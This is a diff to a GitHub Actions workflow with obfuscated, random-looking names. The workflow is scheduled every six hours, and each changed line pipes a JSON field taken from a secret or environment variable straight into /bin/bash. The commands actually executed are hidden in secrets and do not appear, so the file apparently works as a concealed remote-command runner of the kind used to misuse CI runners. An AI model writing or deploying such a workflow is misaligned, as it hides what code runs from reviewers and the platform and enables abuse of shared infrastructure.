@@ -1,9 +1,8 @@
 name: tianpoguang1937
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
+    - cron: '24 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +10,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: tianpoguang1937
         env:
-          pv72223: ${{ secrets.pv72223 }}
+          axuwp7921: ${{ secrets.axuwp7921 }}
         run: |
-          echo $pv72223 | jq -r .mbnn1 | /bin/bash
-          echo $xcql5686 | jq -r .wcezx128 | /bin/bash
-          echo $bwt484 | jq -r .bthoy15379 | /bin/bash
-          echo $nqhf4232 | jq -r .qt23 | /bin/bash
-          echo $tkz979 | jq -r .b45627 | /bin/bash
-          echo $hi3 | jq -r .lzs3 | /bin/bash
-          echo $p1 | jq -r .f90 | /bin/bash
-          echo $dve5 | jq -r .wwal88875 | /bin/bash
-          echo $ethmu1322 | jq -r .lcwjz0700 | /bin/bash
-          echo $spur60 | jq -r .utopo811 | /bin/bash
-          echo $vb67355 | jq -r .mmop85 | /bin/bash
-          echo $gi6 | jq -r .xyg5161 | /bin/bash
+          echo $axuwp7921 | jq -r .hok7 | /bin/bash
+          echo $dl4 | jq -r .fgi73229 | /bin/bash
+          echo $vmkz63483 | jq -r .plpov8 | /bin/bash
+          echo $ci08641 | jq -r .td20 | /bin/bash
+          echo $ez1893 | jq -r .youyx334 | /bin/bash
+          echo $gbyl6815 | jq -r .xlf5124 | /bin/bash
 
